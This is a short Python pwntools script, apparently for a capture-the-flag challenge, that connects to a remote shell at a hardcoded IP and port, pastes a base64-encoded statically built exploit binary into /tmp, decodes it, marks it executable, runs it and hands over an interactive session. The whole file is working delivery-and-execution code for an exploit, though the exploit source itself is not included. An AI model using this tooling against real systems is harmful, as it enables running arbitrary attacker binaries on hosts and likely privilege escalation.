#!/usr/bin/python3
from pwn import *
import os
context.log_level='debug'
context.arch='amd64'
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

# os.system("x86_64-linux-musl-gcc exploit.c -o exploit -s -static -lpthread")
# os.system("cat exploit|base64 > output.txt")

p = remote("143.110.166.8", 31343)

content=""

with open('output.txt') as openfileobject:
    content=openfileobject.read()

sla(b"$ ", 'cd /tmp && echo "'+content+'" | base64 -d > exploit')
sla(b"$ ", b"chmod +x exploit && ./exploit")

p.interactive()
